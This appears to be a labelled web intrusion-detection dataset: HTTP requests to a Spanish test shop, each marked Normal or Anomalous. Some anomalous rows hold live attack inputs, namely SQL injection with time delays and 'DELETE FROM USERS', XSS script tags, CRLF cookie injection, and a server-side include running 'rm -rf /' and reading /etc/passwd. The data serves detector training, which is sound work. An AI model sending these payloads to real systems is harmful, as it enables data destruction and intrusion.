raw_log,classification
GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=siefert&password=f9g10062&nombre=Stahel&apellidos=Mullor+Campllonch&email=debever%40viajesparamujeres.es&dni=65358703V&direccion=Pl.+Ceramista+Gimeno%2C+43%2C+&ciudad=Borobia&cp=33784&provincia=Almer%EDa&ntc=7041334595483221&B1=Registrar HTTP/1.1,Normal
POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 modo=registro&login=juifen5&password=agujer4e2o&nombre=Nazareno&apellidos=Gamb%FAs+Galatioto&email=adams%4011horas.ng&dni=56346174S&direccion=Praza+San+Antonio+Da+Florida%2C+27%2C+&ciudad=Alberuela+de+Tubo&cp=05215&provincia=Salamanca&ntc=5205292790214964&B1=Registrar,Normal
GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=lachance&password=su5a&nombre=Rogato&apellidos=Cucarell+Caridad&email=zmed%40tabernarinconete.uk&dni=19477061V%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&direccion=Manuel+Paez+Xaramillo+33%2C+6B&ciudad=Estella%2FLizarra&cp=26321&provincia=Tarragona&ntc=9995470732934706&B1=Registrar HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/imagenes/cmenbul.gif HTTP/1.1,Normal
POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 modo=registro&login=%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&password=latrin5&nombre=Roxana&apellidos=Barbero+Delgados&email=lutz%40ringringcargo.eg&dni=91059337Z&direccion=C%2F+Llucena%2C+193+2H&ciudad=Almu%F1%E9car&cp=43248&provincia=Barcelona&ntc=6935592091774249&B1=Registrar,Anomalous
GET http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/ HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/asf-logo-wide HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1 errorMsg=Credenciales+incorrectas,Normal
GET http://localhost:8080/tienda1/imagenes/3.gif HTTP/1.1,Normal
POST http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1 B2A=Vaciar+carrito,Anomalous
GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=dirienzo&password=HacEdOr&nombre=Geraldo&apellidosA=Turra+Clop%E9s&email=fang_lavanant%40infotek.gu&dni=39243664Y&direccion=Calle+Tres+Marias%2C+103+&ciudad=Uterga&cp=28980&provincia=Zaragoza&ntc=7982155754096924&B1=Registrar HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=cash3&password=urpila&nombre=Jeanne&apellidosA=Sandrini+Rotllant&email=olmer%40matchball.com.im&dni=52809393J&direccion=Pla%E7a+De+Can+Galta+Cremat%2C+111+&ciudad=Navia&cp=37447&provincia=C%E1diz&ntc=1124103686450000&B1=Registrar HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/miembros/fotos.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/miembros/salir.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/global/estilos.css HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/miembros.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/imagenes/nuestratierra.jpg HTTP/1.1,Normal
POST http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1 errorMsg=%2B,Anomalous
GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=3512&B1=Pasar+por+caja%2F HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=joelly&password=r8cid0va&nombre=Flaviano&apellidos=Sarri%E0+Orbe&email=oshea_knowles%40tiaherminia.gh&dni=14977979B&direccion=Calle+Del+Llenguadoc+S%2FN%2C+6E&ciudad=Pujalt&cp=45183&provincia=Valencia&ntc=0269447503610316&B1=Registrar HTTP/1.1,Normal
GET http://localhost:8080/tienda1/imagenes/logo.gif/asf-logo-wide.gif/.old HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=40&B1=A%F1adir+al+carrito HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Queso+Manchego&precio=39&cantidad=71&B1=A%F1adir+al+carrito HTTP/1.1,Normal
GET http://localhost:8080/examplesWebApp/index.jsp HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/imagenes/1.gif HTTP/1.1,Normal
POST http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1 errorMsg=Credenciales+incorrectas,Normal
GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas HTTP/1.1,Normal
GET http://localhost:8080/tienda1/imagenes/nuestratierra.jpg HTTP/1.1,Normal
GET http://localhost:8080/tienda1/imagenes/nuestratierra.jpg HTTP/1.1,Normal
GET http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg HTTP/1.1,Normal
GET http://localhost:8080/tienda1/imagenes/2.gif HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=holder&pwd=o1e6e2d6&remember=off&B1=Entrar HTTP/1.1,Normal
GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&password=c6r5FOL4o&nombre=Gilbr%E1n&apellidos=Villalobos+Busoms&email=gounaris-ressel%40bru%F1oseguridad.je&dni=94798155K&direccion=Carretera+Platja+Llarga+120%2C+1%3FC&ciudad=Casas+de+Ves&cp=33820&provincia=Cantabria&ntc=4169442426229834&B1=Registrar HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 modo=registro&login=kouhi&password=4aZ&nombre=Rosalinda&apellidos=Gadea+Prat&email=roehn.kernke%40eldeseodepecar.ec&dni=78267819S&direccion=Calle+Rendona+45%2C+5-A&ciudad=Puebla+de+Albort%F3n&cp=43595&provincia=M%E1laga&ntc=8914644367191799&B1=Registrar,Normal
POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 modo=insertar&precio=1006&B1=Confirmar,Normal
GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito HTTP/1.1,Normal
GET http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1,Normal
GET http://localhost:8080/4861362529278789730.BAK HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/miembros/imagenes/castro.jpg HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/imagenes/cmenbul.gif HTTP/1.1,Normal
POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 modo=registro&login=jamilahbob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org&password=e0f2n87a&nombre=Virma&apellidos=Duch+Vilarnau&email=rosamond_aloyshina%40videospornocaseros.aq&dni=84711932B&direccion=Alfredo+Donay+178%2C+&ciudad=Casas+del+Monte&cp=17650&provincia=Toledo&ntc=7712379186246495&B1=Registrar,Anomalous
GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=8912&B1=Pasar+por+caja HTTP/1.1,Normal
POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 modo=registro&login=brunhild&password=te3496&nombre=Andr%F3cies&apellidos=Martin%F3n+Sampayo&email=allaert%40chicasdiabolo.ru&dni=63974696N&direccion=Calle+Plantio%2C+178%2C+&ciudad=Fla%E7%E0&cp=50629&provincia=Navarra&ntc=8099861085079421&B1=Registrar,Normal
GET http://localhost:8080/tienda1/imagenes/3.gif HTTP/1.1,Normal
POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 modo=entrar&login=an-son&pwd=4up493a562i5&remember=on%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&B1=Entrar,Anomalous
GET http://localhost:8080/tienda1/miembros/fotos.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/autenticar.jsp?modoA=entrar&login=girouard&pwd=Disgu5TAd1&remember=off&B1=Entrar HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 modo=insertar&precio=2814&B1=Pasar+por+caja%2F,Anomalous
GET http://localhost:8080/tienda1/imagenes/logo.gif HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1 HTTP/1.1,Normal
GET http://localhost:8080/webapp/examples/simple.jsp HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 modo=insertar&precio=7608&B1=Confirmar,Normal
GET http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1,Normal
POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 modo=registro&login=glancey&password=filol%F3gicamente&nombre=Yago&apellidos=Bartra+Bergu%EDo&email=kaminski%40lola-lutscht.cf&dni=48258022C&direccion=Chalets+De+La+Tierruca%2C+118+8-F%2520&ciudad=Valls&cp=50691&provincia=Ciudad+Real&ntc=8042027288739194&B1=Registrar,Anomalous
GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=chi-yin&password=zAfIo&nombre=Amael&apellidos=Casselle+Cullell&email=vacey%40madrid2012.kw&dni=70541156H&direccion=Plza.+Agueda+Diez%2C+25+10%3FB&ciudad=Oria&cp=19415&provincia=Cantabria&ntc=%2520&B1=Registrar HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=15&B1=A%F1adir+al+carrito HTTP/1.1,Normal
GET http://localhost:8080/tienda1/4861362529278789730 HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=8459&B1=Confirmar%2F HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas HTTP/1.1,Normal
GET http://localhost:8080/tienda1/miembros/salir.jsp HTTP/1.1,Normal
GET http://localhost:8080/samples/sampsite/catalog.htm HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=rachael&password=84ambel&nombre=Malva&apellidos=Mangot+Barr%EDa&email=feld_zaleska%40laschinas.pl&dni=77711232M&direccion=C%2F+Cervera+164%2C+1E&ciudad=Mota+del+Cuervo&cp=36079&provincia=Barcelona&ntc=1834523414581384&B1=Registrar HTTP/1.1,Normal
POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 modo=registro&login=nitin&password=r4mitir&nombre=Lionel&apellidos=Teixidor+Modrego&email=creach%40vindexexpo.gr&dniA=37118814B&direccion=C%2F+Joaquin+Arjona+70%2C+&ciudad=Rionegro+del+Puente&cp=49639&provincia=Barcelona&ntc=8651464575981410&B1=Registrar,Anomalous
GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=chuanhsi&pwd=b129a97r&remember=on&B1=Entrar HTTP/1.1,Normal
GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=linas&password=ceRd24a&nombre=Eranio&apellidos=Cus%F3+Motj%E9&email=twist.dangerfield%40beltoan.com.ne&dni=90907663W&direccion=Once+S%2FN+&ciudad=Ol%EDas+del+Rey&cp=37219&provincia=Lleida&ntc=6481855129498664&B1=Registrar HTTP/1.1,Normal
GET http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/anadir.jsp?id=1%2F&nombre=Vino+Rioja&precio=39&cantidad=68&B1=A%F1adir+al+carrito HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=junkie&password=5arin3-ro&nombre=Sol&apellidos=Ferrada+Montull&email=macnee-voringer%40b-sign.sb&dni=61302831B&direccion=C%2F+Timoteo+Martin%2C+24+7%3FG%2520&ciudad=Quintanilla+de+Arriba&cp=49639&provincia=Barcelona&ntc=6741458111555390&B1=Registrar HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/global/creditos.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/global/creditos.jsp HTTP/1.1,Normal
POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 idA=3&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=32&B1=A%F1adir+al+carrito,Anomalous
GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 modo=insertar&precio=1979&B1=Confirmar%2F,Anomalous
GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=ko%2Clo%3Fs&pwd=Cayar%ED&remember=off&B1=Entrar HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1 B2=Vaciar+carritobob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org,Anomalous
GET http://localhost:8080/tienda1/index.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6264&B1=Confirmar HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/registro.jsp?modo=any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727&login=maudie&password=cegaTo%3Fso&nombre=Yured&apellidos=Modrego+Aylagas&email=natzler.machiavelli%40francislucille.cy&dni=68096192T&direccion=C%2F+Carlos+De+La+Rica%2C+8+11%3FA&ciudad=Puigverd+d%27Agramunt&cp=08672&provincia=Palencia&ntc=6396253761051262&B1=Registrar HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/global/creditos.jsp/asf-logo-wide.gif HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/miembros.jsp/asf-logo-wide.gif~ HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 id=2%2520&nombre=Queso+Manchego&precio=100&cantidad=58&B1=A%F1adir+al+carrito,Anomalous
GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito HTTP/1.1,Normal
GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=%2Cs%2Fi*v&password=d.o4a56%F3n&nombre=Josua&apellidos=Negrete&email=haworth%40rockefeller.uk&dni=32230670B&direccion=Calle+Pura+e+Dora+Vazquez+12%2C+7D&ciudad=Padul&cp=19307&provincia=Almer%EDa&ntc=9549023942251189&B1=Registrar HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=2602&B1=Confirmar%2F HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=%2B HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B-- HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 id=1&nombre=Queso+Manchego&precio=100&cantidadA=13&B1=A%F1adir+al+carrito,Anomalous
GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito HTTP/1.1,Normal
GET http://localhost:8080/tienda1/miembros/imagenes/castro.jpg HTTP/1.1,Normal
POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1 idA=1,Anomalous
GET http://localhost:8080/tienda1/global/titulo.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/asf-logo-wide.gif/ HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/imagenes/logo.gif HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2 HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/miembros.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1,Normal
POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1 idA=2,Anomalous
GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=5316&B1=Confirmar HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas HTTP/1.1,Normal
GET http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg HTTP/1.1,Normal
POST http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1 B2=Vaciar+carrito,Normal
GET http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1,Normal
GET http://localhost:8080/tienda1/global/estilos.css HTTP/1.1,Normal
GET http://localhost:8080/tienda1/imagenes/2.gif HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2 HTTP/1.1,Normal
GET http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1,Normal
POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 modo=registro&login=craig-du&password=8rre0dad7ra&nombre=Octavia&apellidos=Yaben+Billini&email=formichi%40nevadahispanica.pt&dni=09082221G&direccion=Avinguda+Gatassa+S%2FN+5Aany%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727%250D%250A&ciudad=Olmedillo+de+Roa&cp=39255&provincia=Ourense&ntc=9946991800186707&B1=Registrar,Anomalous
GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro%257C&login=kirstie&password=c47M9NaT542&nombre=Lael&apellidos=Carbonel+Estupi%F1a&email=rinaldi%40looktofly.im&dni=23725253V&direccion=Diseminado+La+Soberana+138%2C+3%3FC&ciudad=Arafo&cp=44330&provincia=Huesca&ntc=4981212450509169&B1=Registrar HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/imagenes/1.gif HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/vaciar.jsp/asf-logo-wide HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Queso+Manchego&precio=100&cantidad=%27+DELETE+FROM+USERS&B1=A%F1adir+al+carrito HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=marasliy&password=agu5d92a&nombre=Sharom&apellidos=Bia%F1a+Pomares&emailA=lazzaro_hardin%40naturalagricolacantabria.vc&dni=63637869C&direccion=C%2F+Sevilla%2C+45+4C&ciudad=Pertusa&cp=43718&provincia=Zamora&ntc=4105205025773438&B1=Registrar HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 id=2&nombre=Queso+Manchego&precio=100&cantidad=91&B1A=A%F1adir+al+carrito,Anomalous
POST http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1 B2A=Vaciar+carrito,Anomalous
POST http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1 B2=Vaciar+carrito%2520,Anomalous
GET http://localhost:8080/tienda1/imagenes/logo.gif HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/caracteristicas.jsp/asf-logo-wide.Old HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=75&B1=A%F1adir+al+carrito%257C HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 modo=insertar&precio=7495&B1=Pasar+por+caja%2F,Anomalous
GET http://localhost:8080/tienda1/publico/pagar.jsp?modoA=insertar&precio=4184&B1=Confirmar HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 modo=registro&login=marieann&password=%21and5ajoso&nombre=Lidia&apellidos=Gasull+Vadell&email=awad%40colorprint.nc&dni=28108650M&direccion=C%2F+Pozo+Seco+37%2C+6-D&ciudad=Villafranca+del+Bierzo&cp=05290&provincia=Ciudad+Real&ntc=7583890379589954&B1=Registrar,Normal
POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 id=1&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=16&B1=A%F1adir+al+carrito,Normal
POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 modo=entrar&login=magrath&pwd=1an0re%E15354&remember=off&B1=Entrar,Normal
GET http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Jam%F3n+Ib%E9rico&precio=%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&cantidad=17&B1=A%F1adir+al+carrito HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=finnegan&password=c978ca&nombre=Mailena&apellidos=Spellmann+Calafat&email=henshaw-irish%40ladigianni.ar&dni=25343220A&direccion=C%2F+Aurora%2C+129+%2B&ciudad=Santa+Mar%EDa+del+Campo&cp=02290&provincia=Soria&ntc=8611196070656706&B1=Registrar HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=2 HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg HTTP/1.1,Normal
GET http://localhost:8080/tienda1/miembros/salir.jsp HTTP/1.1,Normal
POST http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1 errorMsg=Credenciales+incorrectas,Normal
GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=shirleen&password=inn%FAmera&nombre=Giuliana&apellidos=Rosselot+Azcona&email=rigas.albalak%40albeiteria.it&dni=61218401Z&direccion=Carrer+Doctor+Esteve%2C+124%2C+&ciudad=Agres&cp=20560&provincia=Salamanca&ntc=2451542120615034&B1=Registrar HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=ailina&password=tel9m%E9trica&nombreA=Fernando&apellidos=Reiriz+Colom%E9&email=dugan%40onlinegratis.ls&dni=70144091W&direccion=Calle+Monte+Del+Taco+102+12%3FA&ciudad=San+Miguel+de+Bernuy&cp=08694&provincia=Almer%EDa&ntc=0887576262160780&B1=Registrar HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 modo=insertar&precio=623&B1A=Pasar+por+caja,Anomalous
GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=hoog&password=rom87231o&nombre=Rider&apellidos=Orero+Mallofr%E9&email=yoyce%40atrioregalos.eu&dni=80788346H&direccion=C%2F+El+Salvador+199%2C+9-A&ciudad=Vegas+del+Genil&cp=46841&provincia=Zamora&ntc=2680573956820155&B1=Registrar HTTP/1.1,Normal
POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 modo=entrar&login=ryan&pwd=fErrErUelO&remember=off&B1=Entrar,Normal
GET http://localhost:8080/tienda1/publico/carrito.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/global/estilos.css HTTP/1.1,Normal
GET http://localhost:8080/CFIDE/administrator/login.cfm HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=dunn&pwd=OASi0s&remember=on&B1=Entrar HTTP/1.1,Normal
GET http://localhost:8080/tienda1/index.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/global/titulo.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar%2520&login=shirai&pwd=3897r%24314m78t8&remember=off&B1=Entrar HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/imagenes/1.gif HTTP/1.1,Normal
GET http://localhost:8080/tienda1/global/titulo.jsp HTTP/1.1,Normal
POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 modo=registro&login=tsolas+&password=c3763ativa.m4n3e&nombre=Frida&apellidos=Llagostera+Llaveria&email=cockneys%40drae2.tl&dni=11939364H&direccion=Calle+Alava+17+12%3FC&ciudad=Sada&cp=25139&provincia=Zaragoza&ntc=3664449984112984&B1=Registrar,Anomalous
GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=mccarron&password=revistero&nombre=Adelqui&apellidos=Valente+Sanchis&email=gargen%40007tv.zw&dni=83296238J&direccion=C%2F+Fuente+Morena%2C+146%2C+&ciudad=Rillo&cp=any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727&provincia=Lleida&ntc=3359754319393302&B1=Registrar HTTP/1.1,Anomalous
GET http://localhost:8080/6909030637832563290.jsp.old HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 id=1&nombre=Vino+Rioja&precio=39&cantidad=42%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E&B1=A%F1adir+al+carrito,Anomalous
GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=2 HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 modo=registro&login=pistilli&password=PErVErTIMieNto&nombre=Delfo&apellidos=Berzoni+Arzaluz&email=starkey%40mcfly.kg&dni=29973823Q&direccion=Calle+Alacant+165+6-B&ciudad=Cabez%F3n+de+Cameros&cp=28691&provincia=L*a+%3FR*ioja&ntc=7673189630192545&B1=Registrar,Anomalous
GET http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1,Normal
GET http://localhost:8080/tienda1/miembros/imagenes/castro.jpg HTTP/1.1,Normal
GET http://localhost:8080/tienda1/global/estilos.css HTTP/1.1,Normal
POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 modo=entrar&login=kuntova&pwd=TROvA&remember=on%2B&B1=Entrar,Anomalous
POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 modo=registro&login=underwoo&password=desportilladura&nombre=Alide&apellidos=Ezama+Ogaz&email=quan%40arroyo-molinos.ee&dni=52948186R&direccion=El+Naranjo%2C+S%2FN+5F&ciudad=Eliana%2C+l%27&cp=34112&provincia=Le%F3n&ntc=5244748375620408&B1=Registrar,Normal
GET http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Queso+Manchego&precio=85&cantidad=12&B1=A%F1adir+al+carrito HTTP/1.1,Normal
POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 modo=registro&login=shorwan&password=zapateo&nombre=Leoncio&apellidos=Sanrom%E1n+Casuso&email=mcilwraith_sopaporn%40barebackspain.info&dni=41628831G&direccion=Costa+Rica%2C+112+&ciudad=Vilanova+de+Segri%E0&cp=47320&provincia=Valladolid&ntc=8961254211923124&B1=Registrar,Normal
GET http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1,Normal
GET http://localhost:8080/iisadmpwd/anot3.htr HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 modo=entrar&login=mehlhaff&pwd=23m6%E9&remember=on&B1A=Entrar,Anomalous
